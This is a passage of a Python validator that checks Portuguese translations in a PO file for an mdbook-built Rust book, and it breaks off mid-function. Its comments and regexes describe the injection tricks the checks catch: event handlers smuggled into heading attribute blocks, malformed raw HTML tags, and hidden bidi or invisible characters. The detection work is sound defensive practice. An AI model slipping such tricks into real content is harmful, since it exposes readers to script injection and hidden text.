#!/usr/bin/env python3
"""Validação de pares (msgid, msgstr) do po/pt-BR.po.

Uso como biblioteca (com `i18n/tools` no sys.path):

    from checks.mensagens import validar_par
    for severidade, mensagem in validar_par(msgid, msgstr):
        ...                       # severidade: 'erro' ou 'aviso'

Uso como script:

    python3 i18n/tools/checks/mensagens.py --autoteste
    python3 i18n/tools/checks/mensagens.py [--po ARQ.po] [--exemplos N]

O segundo modo só LÊ o PO e imprime, por regra e severidade, quantas entradas
traduzidas ou fuzzy foram apontadas, com alguns exemplos. Como no check.py, o 'erro' de
uma entrada fuzzy vira 'aviso' (o livro mostra o inglês), salvo nas entradas do
src/SUMMARY.md: o mdbook-gettext usa o msgstr fuzzy do sumário no menu e no <title>.
O --autoteste não se combina com --po nem com --exemplos. Código de saída: 0 sem 'erro'
(pode haver avisos); 1 se houver 'erro' ou se o --autoteste falhar; 2 em uso incorreto ou
PO ilegível (inexistente, diretório, fora de UTF-8 ou malformado).

Regras (CONTRATO.md §6, numeradas como lá; 'erro' salvo indicação):

  (1)  nao_traduzivel  mensagem de código, âncora ou comentário com msgstr não vazio
  (2)  code_spans      mesmo multiconjunto de trechos de código inline (exato, também
                       com várias crases) e de conteúdos de `<code>...</code>` e `<pre>...</pre>`
  (3)  links           mesmo multiconjunto de destinos de links `](...)` e autolinks `<url>`
                       ou `<e-mail>`
  (4)  referencias     todo rótulo de referência do msgid (`[texto][rótulo]`, `[rótulo][]`,
                       `[rótulo]` não seguido de `(`, `[` ou `:`) continua sendo rótulo no
                       msgstr (sem diferenciar maiúsculas, espaços normalizados); aviso
                       para rótulo novo, erro se o msgstr também o define (`[rótulo]: destino`)
  (5)  listing         `<Listing>`: number=, file-name= e demais atributos idênticos;
                       legenda (caption=) presente se, e só se, presente no msgid; se o msgid
                       começa com a tag, o msgstr também, e a tag fica inteira numa linha,
                       sozinha nela (o mdbook-trpl-listing só a reconhece como bloco HTML);
                       o valor de caption= é Markdown para o mdbook-trpl-listing, e o HTML dele
                       vai cru para o <figcaption>: ele passa pelas regras links, referencias,
                       definicoes, tags_html, atributos_html, html_bloco, estrutura e url_nua,
                       como um texto à parte (rótulo de referência novo na legenda é erro, não aviso)
  (6)  tags_html       mesmo multiconjunto de tags HTML (nome, abrir/fechar); só a ABERTURA
                       de <Listing> fica de fora (a regra listing a confere): o `</Listing>` conta
       atributos_html  atributos que não são texto (id, href, src, class, style...) idênticos
  (7)  ignore          mesma quantidade de `<!-- ignore -->`
  (8)  versoes         toda versão/data do msgid está no msgstr, em qualquer lugar e também
                       com duas partes (`1.98.0`, `2026-08-20`, `rand` 0.10, pre-1.0,
                       HTTP 1.1); aviso para versão que existe só no msgstr
  (9)  slug            `{#id}` só no fim, uma vez, com [A-Za-z0-9_.:-]; nenhum outro bloco `{...}` no fim
                       de linha que o msgid não tenha (num título o mdbook o lê como atributos do
                       <hN>: `{onfocus=...}`), também quando uma referência de caractere (`&#125;`)
                       ou um `{` dentro de código inline o forma
  (10) caracteres      sem surrogate isolado, NUL nem caracteres de controle (exceto \\n e \\t),
                       nem mais controles bidi ou caracteres invisíveis (U+200B, U+2060,
                       U+FEFF...) que o msgid
  (11) identico        (aviso) prosa com msgstr igual ao msgid (sem o ` {#id}` final), com 4
                       palavras ou mais
  (12) enfase          (aviso) quantidade diferente de marcadores de ênfase (_x_, *x*, **x**)

Regras extras (item 13 do contrato):

  aninhamento          mais de 16 níveis de colchetes aninhados no msgstr (texto corrompido
                       ou malicioso; também protege o varredor de colchetes)
  diretivas            mesmo multiconjunto de diretivas do mdbook `{{#...}}`
  bordas               msgid e msgstr começam e terminam com '\\n' nos mesmos casos
                       (o `msgfmt --check` recusa quando diferem)
  vazio                msgstr só com espaços ou caracteres invisíveis (o gettext o trataria
                       como traduzido)
  html_bloco           início de bloco HTML cru sem fechamento ou com a tag malformada no msgstr
                       (`<?`, `<!X`, `<pre ...` sem `>`, `<div =x onmouseover=...>`), ou mais
                       `<!--` que o msgid: esconde o resto da página ou deixa passar HTML cru
  estrutura            o msgstr não abre mais títulos, citações, listas, linhas de traços,
                       cercas ou recuos de código, nem mais parágrafos, que o msgid (também na
                       legenda: o parser dela liga os atributos de título `# x {onfocus=...}`)
  definicoes           o msgstr não tem linha de definição `[rótulo]: destino` (link de
                       referência ou nota de rodapé) que o msgid não tenha, em qualquer
                       posição: a de link só vale no começo do msgstr ou depois de linha em
                       branco (em outra posição sai como texto e é recusada por precaução), a
                       de nota `[^x]:` vira nota em qualquer começo de linha, e as duas criam
                       um destino ou um texto que a regra links não vê
  url_nua              (aviso) URL `http(s)://` (maiúsculas ou minúsculas) no texto do msgstr
                       (fora de código, tag e destino de link) que o msgid não tem em lugar nenhum

Nada aqui levanta exceção: a varredura de colchetes é iterativa (sem recursão) e
cada regra roda isolada; uma falha interna vira um 'erro' da própria regra. A falha ao
analisar a mensagem, antes de qualquer regra, vira um 'erro' da regra 'interno'.
"""
import sys
from pathlib import Path

_AQUI = Path(__file__).resolve().parent      # i18n/tools/checks
_FERRAMENTAS = _AQUI.parent                  # i18n/tools
if __name__ == "__main__":
    # Rodando como script, checks/ vai para sys.path[0] e o checks/html.py
    # sombrearia o módulo 'html' da biblioteca padrão: tira checks/ do caminho.
    sys.path[:] = [p for p in sys.path if Path(p or ".").resolve() != _AQUI]
if str(_FERRAMENTAS) not in sys.path:
    sys.path.insert(0, str(_FERRAMENTAS))

import argparse  # noqa: E402
import os  # noqa: E402
import random  # noqa: E402
import re  # noqa: E402
import unicodedata  # noqa: E402
from bisect import bisect_right  # noqa: E402
from collections import Counter  # noqa: E402

import po_util  # noqa: E402

NOME = "mensagens"

# Ordem em que as regras rodam (e nomes usados no --autoteste e no relatório).
REGRAS = (
    "caracteres", "vazio", "nao_traduzivel", "aninhamento", "code_spans", "links", "referencias",
    "listing", "tags_html", "atributos_html", "ignore", "html_bloco", "versoes", "slug",
    "diretivas", "bordas", "estrutura", "definicoes", "url_nua", "identico", "enfase",
)
# Regra fora de REGRAS: a falha ao analisar a mensagem acontece antes de qualquer regra.
_REGRA_INTERNA = "interno"

# Atributos HTML cujo valor é texto traduzível (todos os outros têm de ficar iguais).
_ATRIBUTOS_TRADUZIVEIS = {"alt", "title", "caption", "aria-label", "placeholder"}

# Marcadores internos: cada trecho "opaco" (código inline, tag, comentário) vira um
# caractere da área de uso privado, com o texto original guardado num dicionário.
# Os caracteres privados que já existiam no texto viram U+FFFD antes da análise, e
# nenhuma mensagem sai com marcador: o texto é sempre restaurado ou escapado.
_PRIMEIRO_MARCADOR = 0xE100
_ULTIMO_MARCADOR = 0xF8FE
_MARCADOR_EXCESSO = "\uf8ff"
_RE_PRIVADO = re.compile("[\ue000-\uf8ff]")

# Tetos que evitam varreduras quadráticas em texto patológico (o CommonMark limita o
# rótulo a 999 caracteres; nenhum destino real do livro chega perto de 4096).
_MAX_DESTINO = 4096
_MAX_PARENTESES = 33               # parênteses aninhados num destino; além disso o pulldown-cmark não faz o link
_MAX_ROTULO = 1000
_MAX_ANINHAMENTO = 16              # colchetes `[[[...]]]` além disso só aparecem em texto corrompido
_MAX_SLUGS_RELATADOS = 3          # mensagens de slug por entrada (o resto vira um total)

_RE_CRASES = re.compile(r"`+")
_RE_IGNORE = re.compile(r"<!--\s*ignore\s*-->")
_RE_NOME_TAG = re.compile(r"<(/?)([A-Za-z][A-Za-z0-9:_.-]*)")
# Autolink `<esquema:destino>` ou `<fulano@exemplo.org>` (este vira link `mailto:`); na parte local do
# e-mail entram também os marcadores de código inline, que o CommonMark lê como crase dentro dele.
_RE_AUTOLINK = re.compile(
    r"<(?:[A-Za-z][A-Za-z0-9+.\-]{1,31}:[^\s<>]*"
    r"|[A-Za-z0-9.!#$%&'*+/=?^_`{|}~\-\ue100-\uf8fe]+@[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?"
    r"(?:\.[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?)*)>"
)
_RE_NOME_ATTR = re.compile(r"[^\s\"'<>/=]+")
_RE_VALOR_ATTR = re.compile(r"[^\s\"'=<>`]+")
_RE_VERSAO = re.compile(
    r"(?<![\d.])"
    r"(?:\d+\.\d+\.\d+(?:-[0-9A-Za-z]+(?:\.[0-9A-Za-z]+)*)?(?:\+[0-9A-Za-z.]+)?"
    r"|\d+(?:\.\d+)+)"
    r"(?!\w)(?!\.\d)"
)
_RE_MILHAR_PT = re.compile(r"\d{1,3}(?:\.\d{3})+")
_RE_DATA = re.compile(r"(?<![\d-])\d{4}-\d{2}-\d{2}(?![\d-])")
_RE_SLUG_QUALQUER = re.compile(r"(?<!\{)\{#([^{}]*)(\}?)")
_RE_SLUG_VALIDO = re.compile(r"[A-Za-z0-9_.:-]+")
_RE_SLUG_FINAL = re.compile(r"\{#[A-Za-z0-9_.:-]+\}")
# Bloco `{...}` no fim de uma linha (depois dele, só espaço ou o slug `{#id}` e espaço), lido no texto como o mdbook
# o recebe do gettext: veja `_blocos_no_fim`. Num título o mdbook 0.5.1 (pulldown-cmark com
# ENABLE_HEADING_ATTRIBUTES) lê como atributos do <hN> o bloco que vai do último `{` da linha ao `}` final
# (`{tabindex=0 autofocus onfocus=...}`), mesmo com `\` antes do `{`. O espaço depois dele é qualquer um (o mdbook
# só ignora espaço, tab, \r e \n; \v e \f entram por cautela). Um `}` no meio (`{onfocus="a}b"}`) hoje desfaz a
# leitura, mas também entra por cautela. O espaço antes do slug é um grupo à parte, sem `*` repetido ou aninhado
# (seria quadrático numa linha de espaços); o slugs.py pode tirar o slug depois (id inseguro) e deixar o bloco no fim
# da linha.
_RE_BLOCO_NO_FIM = re.compile(r"\{[^{\n]*\}(?=[^\S\n]*(?:\{#[A-Za-z0-9_.:-]+\}[^\S\n]*)?$)", re.M)
# Referência de caractere do CommonMark (`&#125;`, `&#x7D;`, `&rcub;`; até 7 dígitos decimais ou 6 hexadecimais, como
# no pulldown-cmark). A ida e volta do mdbook-gettext (msgstr -> eventos -> cmark) a devolve como o próprio
# caractere antes de o mdbook ler o título, então `{onfocus=x&#125;` vira atributo. Só valem as que dão `{`, `}`,
# espaço, tab e quebra de linha (as únicas que abrem, fecham ou seguem um bloco); o resto fica como está.
_RE_REF_CARACTERE = re.compile(r"&(?:#[xX]([0-9A-Fa-f]{1,6})|#([0-9]{1,7})|([A-Za-z]{3,7}));")
_REF_NOMEADA = {"lbrace": "{", "lcub": "{", "rbrace": "}", "rcub": "}", "Tab": "\t", "NewLine": "\n"}
_REF_NUMERICA = {9: "\t", 10: "\n", 11: "\v", 12: "\f", 13: "\r", 32: " ", 123: "{", 125: "}"}
_RE_DIRETIVA = re.compile(r"\{\{#[^{}]*\}\}")
_RE_URL = re.compile(r"https?://\S+", re.I)
# Pontuação que a frase põe depois de uma URL nua (ou fecha o destino/atributo em que ela está).
_PONTUACAO_URL = ".,;:!?)]}>\"'`»”’"
# Linha de definição `[rótulo]: destino` (CommonMark: até 3 espaços de recuo, rótulo sem colchete
# sem escape, que pode atravessar linhas e ter `\` antes de qualquer caractere, a quebra de linha
# inclusive; destino na mesma linha ou na seguinte), no texto já mascarado. A linha sem nada depois
# do `:` também conta: a nota de rodapé `[^x]:` vazia vira nota (com um `id="x"` na página).
_RE_DEFINICAO = re.compile(
    r"^ {0,3}\[((?:[^\[\]\\]|\\[\s\S]){1,999})\]:(?=[ \t]*(?:\n[ \t]*)?\S|[ \t]*$)", re.M)
_RE_DESTINO_DEFINICAO = re.compile(r"[ \t]*(?:\n[ \t]*)?(\S{1,4096})")
_RE_PALAVRA = re.compile(r"[^\W\d_]{2,}")
_RE_CARACTERES_RUINS = re.compile(
    "[\x00-\x08\x0b-\x1f\x7f-\x9f\u2028\u2029\ud800-\udfff\ufffe\uffff]"
)
# Controles de direção (bidi) e caracteres invisíveis de formatação: não aparecem na tela e
# podem inverter ou esconder texto (U+200C e U+200D, usados em emoji, ficam de fora).
_RE_BIDI = re.compile("[\u061c\u200e\u200f\u202a-\u202e\u2066-\u2069]")
_RE_INVISIVEIS = re.compile(
    "[\u00ad\u180e\u200b\u2060\u3164\ufeff\U000e0000-\U000e007f]|" + _RE_BIDI.pattern
)
# Caracteres em branco na tela que não são espaço nem de formatação (preenchimentos Hangul, braille).
_PREENCHIMENTOS = frozenset("\u115f\u1160\u2800\u3164\uffa0")
# Elementos que abrem bloco HTML de tipo 6 (a lista do pulldown-cmark 0.12, que o mdbook-trpl usa).
_ELEMENTOS_BLOCO = (
    "address|article|aside|base|basefont|blockquote|body|caption|center|col|colgroup|dd|details|dialog|"
    "dir|div|dl|dt|fieldset|figcaption|figure|footer|form|frame|frameset|h[1-6]|head|header|hr|html|"
    "iframe|legend|li|link|main|menu|menuitem|nav|noframes|ol|optgroup|option|p|param|search|section|"
    "summary|table|tbody|td|tfoot|th|thead|title|tr|track|ul"
)
# Início de bloco HTML cru (CommonMark, tipos 1 a 6) que sobra depois do mascaramento: a tag não
# termina (tipos 1 a 5) e o bloco atravessa as linhas em branco e engole o resto da página, ou ela
# está malformada (tipo 6: `<div =x onmouseover=...>`, que não é tag para a análise, mas a linha vira
# bloco HTML cru e o atributo chega ao livro). Em qualquer ponto do texto, para valer também depois
# de `>`, `-` ou `1.` (citação, lista).
_RE_BLOCO_HTML = re.compile(
    r"<\?|<![A-Za-z]+|<!\[CDATA\[|<(?:script|pre|style|textarea)(?=[\s>]|$)"
    r"|</?(?:" + _ELEMENTOS_BLOCO + r")(?=[ \t\r\n>]|/>|$)", re.I
)
# Marcadores de bloco Markdown no começo de uma linha (até 3 espaços de recuo); o recuo de
# código e os itens numerados (que só interrompem um parágrafo se forem `1.`) têm tratamento
# à parte em _blocos.
_RE_RECUO = re.compile(r"(?: {4}| {0,3}\t)")
_RE_NUMERADO = re.compile(r" {0,3}(\d{1,9})[.)](?:[ \t]|$)")
_BLOCOS_MARKDOWN = (
    ("título (#)", re.compile(r" {0,3}#{1,6}(?:[ \t]|$)")),
    ("citação (>)", re.compile(r" {0,3}>")),
    ("item de lista (-, *, +)", re.compile(r" {0,3}[-+*](?:[ \t]|$)")),
    ("linha de = ou de traços (título setext ou separador)",
     re.compile(r" {0,3}(?:=+|-+|(?:\*[ \t]*){3,}|(?:_[ \t]*){3,}|(?:-[ \t]*){3,})[ \t]*$")),
    ("cerca de código (``` ou ~~~)", re.compile(r" {0,3}(?:`{3,}|~{3,})")),
)


# --------------------------------------------------------------------------
# Utilidades de texto
# --------------------------------------------------------------------------

def _texto(valor):
    """Garante str (None vira '')."""
    if isinstance(valor, str):
        return valor
    return "" if valor is None else str(valor)


def _mostra(valor, limite=70):
    """Texto seguro para mensagens: sem surrogate/controle/marcador, encurtado."""
    s = _texto(valor)
    s = "".join(c if (c.isprintable() and not ("\ue000" <= c <= "\uf8ff"))
                else c.encode("unicode_escape").decode("ascii") for c in s)
    return s if len(s) <= limite else s[: limite - 1] + "…"


def _lista(itens, maximo=4):
    """Até `maximo` itens entre «», com o resto em (+N), para as mensagens."""
    itens = list(itens)
    corpo = ", ".join(f"«{_mostra(i)}»" for i in itens[:maximo])
    return corpo + (f" (+{len(itens) - maximo})" if len(itens) > maximo else "")


def _diferenca(a, b):
    """Itens que estão em `a` e faltam em `b`, como multiconjuntos (lista ordenada)."""
    return sorted((Counter(a) - Counter(b)).elements(), key=str)


def _troca_ref_caractere(m):
    if m.group(3):
        return _REF_NOMEADA.get(m.group(3), m.group(0))
    return _REF_NUMERICA.get(int(m.group(1), 16) if m.group(1) else int(m.group(2)), m.group(0))


def _decodifica_refs(s):
    """`s` com as referências de caractere de `{`, `}`, espaço, tab e quebra de linha trocadas pelo caractere.

    Nome próprio no lugar de `import html`: dentro de checks/ ele acharia o html.py desta pasta.
    """
    return _RE_REF_CARACTERE.sub(_troca_ref_caractere, s) if "&" in s else s


class _Marcadores:
    """Aloca marcadores privados e guarda o texto original de cada um."""

    def __init__(self):
        self.texto = {}
        self._proximo = _PRIMEIRO_MARCADOR

    def novo(self, original):
        if self._proximo > _ULTIMO_MARCADOR:
            return _MARCADOR_EXCESSO
        c = chr(self._proximo)
        self._proximo += 1
        self.texto[c] = original
        return c

    def restaura(self, s):
        """Troca os marcadores de `s` pelo texto original (uma camada já expandida)."""
        if not _RE_PRIVADO.search(s):
            return s
        return _RE_PRIVADO.sub(lambda m: self.texto.get(m.group(0), "…"), s)


# --------------------------------------------------------------------------
# Análise de uma mensagem
# --------------------------------------------------------------------------

def _trechos_de_codigo(t):
    """Trechos de código inline do CommonMark: [(inicio, fim, n_crases, conteudo)].

    Uma sequência de n crases abre um trecho que a próxima sequência de EXATAMENTE
    n crases fecha; sem fechamento, as crases são texto. `\\`` escapa uma crase fora
    de trechos. Linear no tamanho do texto (índice por comprimento + bisect).
    """
    corridas = [(m.start(), m.end()) for m in _RE_CRASES.finditer(t)]
    por_tamanho = {}
    for idx, (a, b) in enumerate(corridas):
        por_tamanho.setdefault(b - a, []).append(idx)
    trechos = []
    i = 0
    while i < len(corridas):
        a, b = corridas[i]
        n = b - a
        barras = 0
        k = a - 1
        while k >= 0 and t[k] == "\\":
            barras += 1
            k -= 1
        inicio = a
        if barras % 2 == 1:        # a primeira crase está escapada
            inicio += 1
            n -= 1
            if n == 0:
                i += 1
                continue
        indices = por_tamanho.get(n)
        achou = None
        if indices:
            pos = bisect_right(indices, i)
            if pos < len(indices):
                achou = indices[pos]
        if achou is None:
            i += 1
            continue
        fim_a, fim_b = corridas[achou]
        trechos.append((inicio, fim_b, n, t[b:fim_a]))
        i = achou + 1
    return trechos


def _tag_em(s, i):
    """Tenta ler uma tag HTML em s[i] == '<'.

    Devolve (fim, nome, fechando, atributos) ou None. Os valores entre aspas podem
    conter '>' (ex.: caption="Usando `Vec<T>`"). Atributo sem valor vale None.
    """
    m = _RE_NOME_TAG.match(s, i)
    if not m:
        return None
    n = len(s)
    k = m.end()
    if k < n and not (s[k].isspace() or s[k] in ">/"):
        return None
    atributos = []
    while True:
        while k < n and s[k].isspace():
            k += 1
        if k >= n:
            return None
        c = s[k]
        if c == ">":
            k += 1
            break
        if c == "/":
            if k + 1 < n and s[k + 1] == ">":
                k += 2
                break
            return None
        ma = _RE_NOME_ATTR.match(s, k)
        if not ma:
            return None
        nome = ma.group(0)
        k = ma.end()
        k2 = k
        while k2 < n and s[k2].isspace():
            k2 += 1
        valor = None
        if k2 < n and s[k2] == "=":
            k2 += 1
            while k2 < n and s[k2].isspace():
                k2 += 1
            if k2 >= n:
                return None
            q = s[k2]
            if q in "\"'":
                fim = s.find(q, k2 + 1) if s.rfind(q) > k2 else -1
                if fim < 0:
                    return None
                valor = s[k2 + 1:fim]
                k = fim + 1
            else:
                mv = _RE_VALOR_ATTR.match(s, k2)
                if not mv:
                    return None
                valor = mv.group(0)
                k = mv.end()
        atributos.append((nome, valor))
    return k, m.group(2), m.group(1) == "/", atributos


def _mascara_html(s, marcadores):
    """Troca comentários, autolinks e tags HTML por marcadores.

    Devolve (texto_mascarado, tags, autolinks, n_ignore); `tags` é uma lista de
    (nome, fechando, atributos, texto_original).
    """
    partes = []
    tags = []
    autolinks = []
    ignores = 0
    i = 0
    ultimo_fecha = s.rfind("-->")                     # sem '-->' adiante: não procura de novo
    while True:
        j = s.find("<", i)
        if j < 0:
            partes.append(s[i:])
            break
        partes.append(s[i:j])
        if s.startswith("<!--", j) and ultimo_fecha >= j + 4:
            fim = s.find("-->", j + 4)
            if fim >= 0:
                bruto = marcadores.restaura(s[j:fim + 3])
                if _RE_IGNORE.fullmatch(bruto):
                    ignores += 1
                partes.append(marcadores.novo(bruto))
                i = fim + 3
                continue
        m = _RE_AUTOLINK.match(s, j)
        if m:
            bruto = marcadores.restaura(m.group(0))
            autolinks.append(bruto[1:-1])
            partes.append(marcadores.novo(bruto))
            i = m.end()
            continue
        t = _tag_em(s, j)
        if t:
            fim, nome, fechando, attrs = t
            bruto = marcadores.restaura(s[j:fim])
            attrs = [(a, None if v is None else marcadores.restaura(v)) for a, v in attrs]
            tags.append((nome, fechando, attrs, bruto))
            partes.append(marcadores.novo(bruto))
            i = fim
            continue
        partes.append("<")
        i = j + 1
    return "".join(partes), tags, autolinks, ignores


# Saltos rápidos (em C) por trechos "sem graça" dentro de um destino de link: o laço
# em Python só para nos caracteres que importam, o que evita custo quadrático em
# texto patológico como `[a](` repetido milhares de vezes.
_RE_CORRIDA_DESTINO = re.compile(r"[^\s()\\]*")
_RE_CORRIDA_TITULO = {
    '"': re.compile(r'[^"\\]*'),
    "'": re.compile(r"[^'\\]*"),
    ")": re.compile(r"[^)\\]*"),
}


def _destino_inline(s, j):
    """Lê `(destino "título")` a partir de s[j] == '('; devolve (destino, indice_do_')') ou None."""
    n = min(len(s), j + _MAX_DESTINO)
    k = j + 1
    while k < n and s[k].isspace():
        k += 1
    if k >= n:
        return None
    if s[k] == "<":
        fim = s.find(">", k + 1, n)
        if fim < 0 or "\n" in s[k:fim]:
            return None
        destino = s[k + 1:fim]
        k = fim + 1
    else:
        inicio = k
        profundidade = 0
        while k < n:
            k = _RE_CORRIDA_DESTINO.match(s, k, n).end()
            if k >= n:
                break
            c = s[k]
            if c == "\\":
                k += 2
                continue
            if c.isspace():
                break
            if c == "(":
                profundidade += 1
                if profundidade > _MAX_PARENTESES:     # o pulldown-cmark também desiste; evita custo quadrático
                    return None
            else:                                  # c == ")"
                if profundidade == 0:
                    break
                profundidade -= 1
            k += 1
        destino = s[inicio:min(k, n)]
    while k < n and s[k].isspace():
        k += 1
    if k < n and s[k] in "\"'(":
        fecha = ")" if s[k] == "(" else s[k]
        corrida = _RE_CORRIDA_TITULO[fecha]
        k += 1
        while True:
            k = corrida.match(s, k, n).end() if k < n else n
            if k >= n:
                return None
            if s[k] == "\\":
                k += 2
                continue
            break                                   # achou o fecha
        k += 1
        while k < n and s[k].isspace():
            k += 1
    if k < n and s[k] == ")":
        return destino.strip(), k
    return None


def _rotulo_depois(s, j):
    """Lê `[rótulo]` a partir de s[j] == '['; devolve (rótulo, indice_do_']') ou None."""
    n = min(len(s), j + _MAX_ROTULO)
    k = j + 1
    while k < n:
        c = s[k]
        if c == "\\":
            k += 2
            continue
        if c == "[":
            return None
        if c == "]":
            return s[j + 1:k], k
        k += 1
    return None


def _varre_colchetes(s):
    """Varre colchetes SEM recursão (pilha explícita).

    Devolve (destinos, rotulos, cortes, profundidade): destinos de links em linha
    `](...)`; rótulos de referência (texto bruto, sem normalizar); `cortes`, os
    intervalos de s ocupados pelos `(destino)` para quem quiser ignorá-los; e a
    maior profundidade de colchetes abertos ao mesmo tempo.
    """
    destinos = []
    rotulos = []
    cortes = []
    pilha = []                         # [posição do '[', tem colchete aninhado]
    profundidade = 0
    n = len(s)
    i = 0
    while i < n:
        c = s[i]
        if c == "\\":
            i += 2
            continue
        if c == "[":
            pilha.append([i, False])
            profundidade = max(profundidade, len(pilha))
            i += 1
            continue
        if c != "]" or not pilha:
            i += 1
            continue
        ini, aninhado = pilha.pop()
        if pilha:
            pilha[-1][1] = True
        prox = s[i + 1] if i + 1 < n else ""
        if prox == "(":
            r = _destino_inline(s, i + 1)
            if r:
                destinos.append(r[0])
                cortes.append((i + 1, r[1] + 1))
                i = r[1] + 1
                continue
        elif prox == "[":
            r = _rotulo_depois(s, i + 1)
            if r:
                rotulo, fim = r
                if rotulo.strip():
                    rotulos.append(rotulo)             # [texto][rótulo]
                elif not aninhado:
                    rotulos.append(s[ini + 1:i])       # [rótulo][]
                i = fim + 1
                # `[texto][rótulo](destino)`: se o rótulo não estiver definido, o `[rótulo](destino)` é um
                # link em linha de verdade (o CommonMark só lê a referência quando o rótulo existe)
                if s[i:i + 1] == "(":
                    r = _destino_inline(s, i)
                    if r:
                        destinos.append(r[0])
                        cortes.append((i, r[1] + 1))
                        i = r[1] + 1
                continue
        elif prox != ":" and not aninhado:
            rotulos.append(s[ini + 1:i])               # [rótulo]
        i += 1
    return destinos, rotulos, cortes, profundidade


def _sem_cortes(s, cortes):
    if not cortes:
        return s
    partes = []
    pos = 0
    for a, b in cortes:
        partes.append(s[pos:a])
        pos = b
    partes.append(s[pos:])
    return "".join(partes)


class _Analise:
    """Tudo o que as regras precisam saber de uma mensagem (msgid ou msgstr)."""

    def __init__(self, texto):
        self.original = _texto(texto)
        t = _RE_PRIVADO.sub("\ufffd", self.original)
        self.marcadores = _Marcadores()
        trechos = _trechos_de_codigo(t)
        partes = []
        pos = 0
        self.codigos = []                      # [(n_crases, conteúdo normalizado)]
        for inicio, fim, n, conteudo in trechos:
            partes.append(t[pos:inicio])
            partes.append(self.marcadores.novo(t[inicio:fim]))
            self.codigos.append((n, conteudo.replace("\n", " ")))
            pos = fim
        partes.append(t[pos:])
        s1 = "".join(partes)
        (self.mascarado, self.tags, self.autolinks,
         self.n_ignore) = _mascara_html(s1, self.marcadores)
        self.decodificado = _decodifica_refs(self.mascarado)       # fora de código e de tags, onde a referência vale
        self.codigos.extend(self._codigos_html())
        destinos, rotulos, cortes, self.prof_colchetes = _varre_colchetes(self.mascarado)
        restaura = self.marcadores.restaura
        self.destinos = [restaura(d) for d in destinos] + list(self.autolinks)
        # chave de comparação (sem caixa, espaços normalizados) e a primeira forma original
        # de cada rótulo, para as mensagens mostrarem o que o tradutor escreveu de fato
        self.rotulos = []
        self.rotulos_originais = {}
        for r in rotulos:
            original = " ".join(restaura(r).split())
            chave = original.casefold()
            self.rotulos.append(chave)
            self.rotulos_originais.setdefault(chave, original)
        self.sem_destinos = _sem_cortes(self.mascarado, cortes)
        # linhas `[rótulo]: destino` (fora de código, tag e comentário): [(rótulo normalizado, destino)]
        # e o texto de cada uma para as mensagens; o texto de uma nota de rodapé (`[^x]:`) se traduz,
        # então ela conta só pelo rótulo
        self.definicoes = []
        self.definicoes_texto = {}
        for m in _RE_DEFINICAO.finditer(self.mascarado):
            rotulo = " ".join(restaura(m.group(1)).split())
            chave = rotulo.casefold()
            destino = ""
            if not chave.startswith("^"):
                d = _RE_DESTINO_DEFINICAO.match(self.mascarado, m.end())
                destino = restaura(d.group(1)) if d else ""
            self.definicoes.append((chave, destino))
            self.definicoes_texto.setdefault((chave, destino), f"[{rotulo}]:" + (f" {destino}" if destino else ""))

    def _codigos_html(self):
        """[("<code>" ou "<pre>", conteúdo)]: o texto de `<code>...</code>` e de `<pre>...</pre>`.

        É código como o dos trechos com crases: não se traduz. Vale só o elemento mais externo de
        cada nome, e o `<code>` dentro de um `<pre>` fica no `<pre>` (que inclui as tags de dentro,
        como `<em>PATTERN</em>`): cada trecho é restaurado uma vez, em tempo linear. Sem
        fechamento correspondente nada é comparado (a regra tags_html aponta a diferença).
        """
        saida = []
        abertos = {"code": [], "pre": []}      # posição logo depois de cada abertura ainda sem fechar
        for i, c in enumerate(self.mascarado):
            bruto = self.marcadores.texto.get(c)
            m = _RE_NOME_TAG.match(bruto) if bruto else None
            nome = m.group(2).lower() if m else None
            if nome not in abertos:
                continue
            if not m.group(1):
                if not bruto.endswith("/>"):
                    abertos[nome].append(i + 1)
            elif abertos[nome]:
                inicio = abertos[nome].pop()
                if not abertos[nome] and (nome == "pre" or not abertos["pre"]):
                    conteudo = self.marcadores.restaura(self.mascarado[inicio:i])
                    saida.append((f"<{nome}>", conteudo.replace("\n", " ")))
        return saida

    # texto para contar palavras: sem marcadores nem destinos
    def palavras(self):
        texto = _RE_URL.sub(" ", _RE_PRIVADO.sub(" ", self.sem_destinos))
        return len(_RE_PALAVRA.findall(texto))


def _tags_listing(a):
    return [t for t in a.tags if t[0] == "Listing" and not t[1]]


# --------------------------------------------------------------------------
# Regras. Cada uma recebe (msgid analisado, msgstr analisado, adiciona).
# --------------------------------------------------------------------------

def _regra_caracteres(msgid, msgstr, add):
    s = msgstr.original
    ruins = list(_RE_CARACTERES_RUINS.finditer(s))
    if ruins:
        descricao = []
        for m in ruins[:4]:
            c = m.group(0)
            if "\ud800" <= c <= "\udfff":
                nome = "surrogate isolado"
            elif c == "\x00":
                nome = "NUL"
            elif c in "\u2028\u2029":
                nome = "separador de linha/parágrafo Unicode"
            elif c in "\ufffe\uffff":
                nome = "não-caractere Unicode"
            else:
                nome = "caractere de controle"
            descricao.append(f"{nome} U+{ord(c):04X} na posição {m.start()}")
        extra = f" (+{len(ruins) - 4})" if len(ruins) > 4 else ""
        add("caracteres", "erro",
            "caracteres inválidos no msgstr: " + "; ".join(descricao) + extra
            + " (só '\\n' e '\\t' são aceitos como controle; surrogate costuma ser emoji cortado)")
    if s.count("\ufffd") > msgid.original.count("\ufffd"):
        add("caracteres", "erro",
            "caractere de substituição U+FFFD no msgstr (texto corrompido na geração)")
    # Controles bidi e invisíveis só valem se o msgid também os tem (o msgstr copia o original);
    # a mais, eles invertem ou escondem texto no livro sem aparecer para quem lê o PO.
    no_id = Counter(_RE_INVISIVEIS.findall(msgid.original))
    a_mais = sorted(c for c, n in Counter(_RE_INVISIVEIS.findall(s)).items() if n > no_id[c])
    if a_mais:
        add("caracteres", "erro",
            "caracteres invisíveis ou de controle de direção (bidi) a mais no msgstr: "
            + "; ".join(f"U+{ord(c):04X} ({'controle bidi' if _RE_BIDI.match(c) else 'invisível'})"
                        for c in a_mais[:4])
            + (f" (+{len(a_mais) - 4})" if len(a_mais) > 4 else "")
            + " (podem inverter ou esconder texto no livro; tire-os)")


def _invisivel(c):
    """Espaço ou caractere que não aparece na tela (formatação, marca combinante, preenchimento)."""
    return c.isspace() or unicodedata.category(c) in ("Cf", "Mn", "Me") or c in _PREENCHIMENTOS


def _regra_vazio(msgid, msgstr, add):
    s = msgstr.original
    if s and all(_invisivel(c) for c in s):
        add("vazio", "erro",
            "msgstr só com espaços ou caracteres invisíveis (zero width, soft hyphen, BOM...): "
